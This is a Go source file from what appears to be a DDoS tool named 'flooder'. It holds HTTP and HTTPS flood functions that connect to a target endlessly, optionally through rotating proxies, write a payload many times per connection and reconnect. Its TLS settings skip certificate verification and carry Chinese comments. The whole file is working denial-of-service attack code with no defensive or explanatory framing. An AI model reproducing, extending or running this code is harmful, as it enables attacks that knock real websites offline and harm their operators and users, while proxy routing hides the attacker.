package methods

import (
	"crypto/tls"
	"flooder/Utils"
	"math/rand"
	"net"
	"time"
)

var (
	TLSConfigD = &tls.Config{
		MinVersion: tls.VersionTLS12, // 设置最低支持版本为TLS1.2
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
			tls.CurveP384,
		}, // 支持的曲线类型
		InsecureSkipVerify:       true, // 是否需要验证服务器证书
		PreferServerCipherSuites: true, // 使用服务器加密套件列表中的加密算法
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		}, // 支持的加密套件列表
	}
)

func https_flood(proxyConn net.Conn, payload []byte, repeatRequest int, TLSConfig *tls.Config) {
	tlsConn := tls.Client(proxyConn, TLSConfig)
	for i := 0; i < repeatRequest; i++ {
		tlsConn.Write(payload)
	}
	tlsConn.Close()
}

func Http_flood(proxyAddr, targetAddr string, payload []byte, https bool, repeatRequest int, noProxiedRate float64) {
	for {
		if proxyAddr == "no proxy" || rand.Float64() < noProxiedRate {
			proxyAddr = targetAddr
		}
		proxyConn, err := net.DialTimeout("tcp", proxyAddr, 5*time.Second)

		if err != nil {
			return
		}
		proxyConn.SetDeadline(time.Now().Add(5 * time.Second))
		if proxyAddr != targetAddr {
			Utils.StartProxyHTTP(proxyConn, targetAddr)
		}
		// Now conn is a transparent proxy connection to the target server
		if https {
			https_flood(proxyConn, payload, repeatRequest, TLSConfigD)
		} else {
			for i := 0; i < repeatRequest; i++ {
				proxyConn.Write(payload)
			}
		}
		proxyConn.Close()

	}
}
